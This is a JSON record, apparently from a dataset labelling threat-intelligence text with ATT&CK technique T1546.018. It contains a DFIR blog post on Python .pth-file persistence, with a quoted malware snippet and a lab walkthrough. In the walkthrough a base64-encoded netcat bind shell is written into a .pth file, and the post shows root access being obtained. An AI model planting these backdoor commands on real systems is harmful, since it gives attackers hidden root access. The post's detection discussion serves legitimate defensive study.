@@ -1,0 +1,135 @@
+{
+  "original_txt": "Analysis of Python's .pth files as a persistence mechanism\nTable of Contents\nIntroduction\nThe purpose of the update.py script is to deploy a backdoor to the following path: /usr/lib/python3.6/site-packages/system.pth. The backdoor, written in Python, starts by an import and its main content is stored as a base64 encoded blob. The .pth extension is used to append additional paths to a Python module. Starting with the release of Python 3.5, lines in .pth files beginning with the text “import” followed by a space or a tab, are executed as described in the official documentation. Therefore, by creating this file, each time any other code on the device attempts to import the module, the malicious code is executed.\nTo recap: Starting with Python 3.5, lines in .pth files starting with “import” followed by a space or tab are executed. This allows malicious code in such files to run whenever any code on the device imports a module. In this blog post, we will look into the details of this backdooring technique, examining its implementation and investigating whether it leaves any traces behind.\nPath Configuration Files\nPath Configuration Files\n(.pth) provide a way for Python to extend its module search paths, enabling the inclusion of extra directories where Python looks for modules and packages.\nWhen a .pth\nfile is placed in a directory like site-packages\nor dist-packages\n(we’ll cover these shortly), Python processes these files during startup. Each line in the .pth\nfile can either add a directory to the module search path or execute Python code under specific conditions, as highlighted by Volexity. In particular, lines starting with import (followed by a space or tab) are executed. Leveraging a .pth\nfile is a creative and stealthy method to persist on a compromised system, as most Digital Forensics and Incident Response (DFIR) tools and enumeration scripts typically do not explicitly check for additional Python path configuration files.\nAnalysis of a malicious file\nThe file update.py\n(MD5: 0c1554888ce9ed0da1583dbdf7b31651\n), discovered by Volexity, contains the following Python code. The complete file is available on VirusTotal:\ndef protect():\nimport os,signal\nsystempth = \"/usr/lib/python3.6/site-packages/system.pth\"\ncontent = open(systempth).read()\n# os.unlink(__file__)\ndef stop(sig,frame):\nif not os.path.exists(systempth):\nwith open(systempth,\"w\") as f:\nf.write(content)\nThe backdoor ensures that the file system.pth\ncannot be deleted. While Volexity has not shared the exact contents of this file, we can recreate the code execution in our lab using a similar .pth\nfile.\nIn the Python code above, the directory /usr/lib/python3.6/site-packages/\nis used to store the malicious .pth\nfile. However, this path may vary depending on the system configuration. So, what other options are available? According to the Python documentation: The site module also provides a way to get the user directories from the command line.:\nroot@pth:~# python3 -m site\nsys.path = [\n'/root',\n'/usr/lib/python312.zip',\n'/usr/lib/python3.12',\n'/usr/lib/python3.12/lib-dynload',\n'/usr/local/lib/python3.12/dist-packages',\n'/usr/lib/python3/dist-packages',\n]\nUSER_BASE: '/root/.local' (doesn't exist)\nUSER_SITE: '/root/.local/lib/python3.12/site-packages' (doesn't exist)\nENABLE_USER_SITE: True\nOn our Ubuntu server, there isn’t a site-packages\nfolder, but we do have a dist-packages\ndirectory. Let’s explore whether we can establish a stealthy persistence mechanism here as well.\nExploiting\nWe are utilizing a basic Netcat (nc) bind shell as the payload. Once executed, it will open port 45555 to the internet, providing access as soon as someone runs Python code on our compromised server.\nroot@pth:~# echo 'nohup bash -c \"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f\n| /bin/sh -i 2>&1\n| nc -l 0.0.0.0 45555 > /tmp/f\" &' | base64 -w0\nbm9odXAgY[..]ZiIgJgo=\nThe Base64-encoded command is embedded within the following script, which will be written to the file /usr/local/lib/python3.12/dist-packages/malmoeb.pth\n. It’s important to note that a .pth\nfile must begin with the keyword import;\notherwise, Python will not execute the code contained within it.\nroot@pth:~# echo \"import os; os.system('echo \"bbm9odXAgY[..]ZiIgJgo=\" |\nbase64 -d|bash')\" > /usr/local/lib/python3.12/dist-packages/malmoeb.pth\nThis is an effective persistence technique because it only takes a simple Python execution to trigger it:\nroot@pth:~# python3 -c \"print('dfir.ch')\"\ndfir.ch\nOur backdoor is now open, and we can successfully connect to the compromised server:\nmalmoeb@home ~ % nc 164.90.220.147 45555\n# id\nuid=0(root) gid=0(root) groups=0(root)\n#\nGreat! If you’ve been paying attention to the output of python3 -m site\nabove, you may have noticed that the site-packages\nfolder is missing under the /root\ndirectory. Let’s explore this approach:\nroot@pth:~# mkdir -p /root/.local/lib/python3.12/site-packages\nroot@pth:~# mv malmoeb.pth /root/.local/lib/python3.12/site-packages\nroot@pth:~# python3 -c \"print('dfir.ch')\"\nAnd yes, we got a shell (again).\nAnd now?\nIf an EDR were present on the compromised Linux system, the process chain (Python -> Bash -> nc) would likely trigger an alert, or even just Python -> Bash could raise suspicion. Furthermore, closely monitoring newly created .pth\nfiles could help detect these persistence mechanisms. However, default security solutions are unlikely to identify such backdoors or the execution of code within .pth\nfiles.\nThe risks associated with hidden .pth\nfiles have already been discussed in the cpython\nproject’s issue tracker (Issue #113659).\nThe severity of this issue is not very large, because it requires user interaction to activate. But it increases the risk. I think we should forbid processing hidden pth files.\n$PYTHONPATH - Down the rabbit hole\nItzik Kotler Co-Founder & CTO of SafeBreach, presented I'm In Your $PYTHONPATH, Backdooring Your Python Programs\n(slides available here).\nIn his presentation, Itzik demonstrated how any Python module can be modified with additional code without altering the original functionality of the module. He used the PYTHONPATH\nenvironment variable to redirect to the modified module, which, in my opinion, adds an interesting layer to the .pth\nfile technique discussed here.\nAfter a compromise, Python modules could be injected with malicious code, or the PYTHONPATH\nenvironment variable could be hijacked. How many security teams would actually detect such behavior?",
+  "sanitized_txt": "Analysis of Python's .pth files as a persistence mechanism Table of Contents Introduction The purpose of the update.py script is to deploy a backdoor to the following path: /usr/lib/python3.6/site-packages/system.pth. The backdoor, written in Python, starts by an import and its main content is stored as a base64 encoded blob. The .pth extension is used to append additional paths to a Python module. Starting with the release of Python 3.5, lines in .pth files beginning with the text “import” followed by a space or a tab, are executed as described in the official documentation. Therefore, by creating this file, each time any other code on the device attempts to import the module, the malicious code is executed.\nTo recap: Starting with Python 3.5, lines in .pth files starting with “import” followed by a space or tab are executed. This allows malicious code in such files to run whenever any code on the device imports a module. In this blog post, we will look into the details of this backdooring technique, examining its implementation and investigating whether it leaves any traces behind.\nPath Configuration Files Path Configuration Files (.pth) provide a way for Python to extend its module search paths, enabling the inclusion of extra directories where Python looks for modules and packages.\nWhen a .pth file is placed in a directory like site-packages or dist-packages (we’ll cover these shortly), Python processes these files during startup. Each line in the .pth file can either add a directory to the module search path or execute Python code under specific conditions, as highlighted by Volexity. In particular, lines starting with import (followed by a space or tab) are executed. Leveraging a .pth file is a creative and stealthy method to persist on a compromised system, as most Digital Forensics and Incident Response (DFIR) tools and enumeration scripts typically do not explicitly check for additional Python path configuration files.\nAnalysis of a malicious file The file update.py (MD5: 0c1554888ce9ed0da1583dbdf7b31651 ), discovered by Volexity, contains the following Python code. The complete file is available on VirusTotal:\ndef protect():\nimport os,signal systempth = \"/usr/lib/python3.6/site-packages/system.pth\" content = open(systempth).read() # os.unlink(__file__) def stop(sig,frame):\nif not os.path.exists(systempth):\nwith open(systempth,\"w\") as f:\nf.write(content) The backdoor ensures that the file system.pth cannot be deleted. While Volexity has not shared the exact contents of this file, we can recreate the code execution in our lab using a similar .pth file.\nIn the Python code above, the directory /usr/lib/python3.6/site-packages/ is used to store the malicious .pth file. However, this path may vary depending on the system configuration. So, what other options are available? According to the Python documentation: The site module also provides a way to get the user directories from the command line.:\nroot@pth:~# python3 -m site sys.path = [ '/root', '/usr/lib/python312.zip', '/usr/lib/python3.12', '/usr/lib/python3.12/lib-dynload', '/usr/local/lib/python3.12/dist-packages', '/usr/lib/python3/dist-packages', ] USER_BASE: '/root/.local' (doesn't exist) USER_SITE: '/root/.local/lib/python3.12/site-packages' (doesn't exist) ENABLE_USER_SITE: True On our Ubuntu server, there isn’t a site-packages folder, but we do have a dist-packages directory. Let’s explore whether we can establish a stealthy persistence mechanism here as well.\nExploiting We are utilizing a basic Netcat (nc) bind shell as the payload. Once executed, it will open port 45555 to the internet, providing access as soon as someone runs Python code on our compromised server.\nroot@pth:~# echo 'nohup bash -c \"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 45555 > /tmp/f\" &' | base64 -w0 bm9odXAgY[..]ZiIgJgo= The Base64-encoded command is embedded within the following script, which will be written to the file /usr/local/lib/python3.12/dist-packages/malmoeb.pth . It’s important to note that a .pth file must begin with the keyword import;\notherwise, Python will not execute the code contained within it.\nroot@pth:~# echo \"import os; os.system('echo \"bbm9odXAgY[..]ZiIgJgo=\" | base64 -d|bash')\" > /usr/local/lib/python3.12/dist-packages/malmoeb.pth This is an effective persistence technique because it only takes a simple Python execution to trigger it:\nroot@pth:~# python3 -c \"print('dfir.ch')\" dfir.ch Our backdoor is now open, and we can successfully connect to the compromised server:\nmalmoeb@home ~ % nc 164.90.220.147 45555 # id uid=0(root) gid=0(root) groups=0(root) # Great! If you’ve been paying attention to the output of python3 -m site above, you may have noticed that the site-packages folder is missing under the /root directory. Let’s explore this approach:\nroot@pth:~# mkdir -p /root/.local/lib/python3.12/site-packages root@pth:~# mv malmoeb.pth /root/.local/lib/python3.12/site-packages root@pth:~# python3 -c \"print('dfir.ch')\" And yes, we got a shell (again).\nAnd now?\nIf an EDR were present on the compromised Linux system, the process chain (Python -> Bash -> nc) would likely trigger an alert, or even just Python -> Bash could raise suspicion. Furthermore, closely monitoring newly created .pth files could help detect these persistence mechanisms. However, default security solutions are unlikely to identify such backdoors or the execution of code within .pth files.\nThe risks associated with hidden .pth files have already been discussed in the cpython project’s issue tracker (Issue #113659).\nThe severity of this issue is not very large, because it requires user interaction to activate. But it increases the risk. I think we should forbid processing hidden pth files.\n$PYTHONPATH - Down the rabbit hole Itzik Kotler Co-Founder & CTO of SafeBreach, presented I'm In Your $PYTHONPATH, Backdooring Your Python Programs (slides available here).\nIn his presentation, Itzik demonstrated how any Python module can be modified with additional code without altering the original functionality of the module. He used the PYTHONPATH environment variable to redirect to the modified module, which, in my opinion, adds an interesting layer to the .pth file technique discussed here.\nAfter a compromise, Python modules could be injected with malicious code, or the PYTHONPATH environment variable could be hijacked. How many security teams would actually detect such behavior?",
+  "ID_list": [
+    "T1546.018"
+  ],
+  "Name_list": [
+    "Execution",
+    "Persistence"
+  ],
+  "TTP_sentences": {
+    "T1546.018": [
+      {
+        "sentence": "Analysis of Python's .pth files as a persistence mechanism Table of Contents Introduction The purpose of the update.py script is to deploy a backdoor to the following path: /usr/lib/python3.6/site-packages/system.pth.",
+        "score": 0.7106
+      },
+      {
+        "sentence": "The backdoor, written in Python, starts by an import and its main content is stored as a base64 encoded blob.",
+        "score": 0.5342
+      },
+      {
+        "sentence": "The .pth extension is used to append additional paths to a Python module.",
+        "score": 0.5885
+      },
+      {
+        "sentence": "Starting with the release of Python 3.5, lines in .pth files beginning with the text “import” followed by a space or a tab, are executed as described in the official documentation.",
+        "score": 0.6192
+      },
+      {
+        "sentence": "Therefore, by creating this file, each time any other code on the device attempts to import the module, the malicious code is executed.",
+        "score": 0.5315
+      },
+      {
+        "sentence": "To recap: Starting with Python 3.5, lines in .pth files starting with “import” followed by a space or tab are executed.",
+        "score": 0.6111
+      },
+      {
+        "sentence": "This allows malicious code in such files to run whenever any code on the device imports a module.",
+        "score": 0.5361
+      },
+      {
+        "sentence": "In this blog post, we will look into the details of this backdooring technique, examining its implementation and investigating whether it leaves any traces behind.",
+        "score": 0.4308
+      },
+      {
+        "sentence": "Path Configuration Files Path Configuration Files (.pth) provide a way for Python to extend its module search paths, enabling the inclusion of extra directories where Python looks for modules and packages.",
+        "score": 0.6233
+      },
+      {
+        "sentence": "When a .pth file is placed in a directory like site-packages or dist-packages (we’ll cover these shortly), Python processes these files during startup.",
+        "score": 0.7155
+      },
+      {
+        "sentence": "Each line in the .pth file can either add a directory to the module search path or execute Python code under specific conditions, as highlighted by Volexity.",
+        "score": 0.6207
+      },
+      {
+        "sentence": "In particular, lines starting with import (followed by a space or tab) are executed.",
+        "score": 0.5145
+      },
+      {
+        "sentence": "Leveraging a .pth file is a creative and stealthy method to persist on a compromised system, as most Digital Forensics and Incident Response (DFIR) tools and enumeration scripts typically do not explicitly check for additional Python path configuration files.",
+        "score": 0.6406
+      },
+      {
+        "sentence": "Analysis of a malicious file The file update.py (MD5: 0c1554888ce9ed0da1583dbdf7b31651 ), discovered by Volexity, contains the following Python code.",
+        "score": 0.5317
+      },
+      {
+        "sentence": "The complete file is available on VirusTotal: def protect(): import os,signal systempth = \"/usr/lib/python3.6/site-packages/system.pth\" content = open(systempth).read() # os.unlink(__file__) def stop(sig,frame): if not os.path.exists(systempth): with open(systempth,\"w\") as f: f.write(content) The backdoor ensures that the file system.pth cannot be deleted.",
+        "score": 0.4771
+      },
+      {
+        "sentence": "While Volexity has not shared the exact contents of this file, we can recreate the code execution in our lab using a similar .pth file.",
+        "score": 0.4454
+      },
+      {
+        "sentence": "In the Python code above, the directory /usr/lib/python3.6/site-packages/ is used to store the malicious .pth file.",
+        "score": 0.6113
+      },
+      {
+        "sentence": "However, this path may vary depending on the system configuration.",
+        "score": 0.4
+      },
+      {
+        "sentence": "Let’s explore whether we can establish a stealthy persistence mechanism here as well.",
+        "score": 0.4411
+      },
+      {
+        "sentence": "Once executed, it will open port 45555 to the internet, providing access as soon as someone runs Python code on our compromised server. root@pth:~# echo 'nohup bash -c \"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 45555 > /tmp/f\" &' | base64 -w0 bm9odXAgY[..]ZiIgJgo= The Base64-encoded command is embedded within the following script, which will be written to the file /usr/local/lib/python3.12/dist-packages/malmoeb.pth .",
+        "score": 0.531
+      },
+      {
+        "sentence": "If you’ve been paying attention to the output of python3 -m site above, you may have noticed that the site-packages folder is missing under the /root directory.",
+        "score": 0.5669
+      },
+      {
+        "sentence": "Let’s explore this approach: root@pth:~# mkdir -p /root/.local/lib/python3.12/site-packages root@pth:~# mv malmoeb.pth /root/.local/lib/python3.12/site-packages root@pth:~# python3 -c \"print('dfir.ch')\" And yes, we got a shell (again).",
+        "score": 0.5747
+      },
+      {
+        "sentence": "If an EDR were present on the compromised Linux system, the process chain (Python -> Bash -> nc) would likely trigger an alert, or even just Python -> Bash could raise suspicion.",
+        "score": 0.381
+      },
+      {
+        "sentence": "Furthermore, closely monitoring newly created .pth files could help detect these persistence mechanisms.",
+        "score": 0.5403
+      },
+      {
+        "sentence": "However, default security solutions are unlikely to identify such backdoors or the execution of code within .pth files.",
+        "score": 0.5005
+      },
+      {
+        "sentence": "The risks associated with hidden .pth files have already been discussed in the cpython project’s issue tracker (Issue #113659).",
+        "score": 0.3846
+      },
+      {
+        "sentence": "I think we should forbid processing hidden pth files. $PYTHONPATH - Down the rabbit hole Itzik Kotler Co-Founder & CTO of SafeBreach, presented I'm In Your $PYTHONPATH, Backdooring Your Python Programs (slides available here).",
+        "score": 0.5045
+      },
+      {
+        "sentence": "In his presentation, Itzik demonstrated how any Python module can be modified with additional code without altering the original functionality of the module.",
+        "score": 0.515
+      },
+      {
+        "sentence": "He used the PYTHONPATH environment variable to redirect to the modified module, which, in my opinion, adds an interesting layer to the .pth file technique discussed here.",
+        "score": 0.5879
+      },
+      {
+        "sentence": "After a compromise, Python modules could be injected with malicious code, or the PYTHONPATH environment variable could be hijacked.",
+        "score": 0.5704
+      }
+    ]
+  }
+}
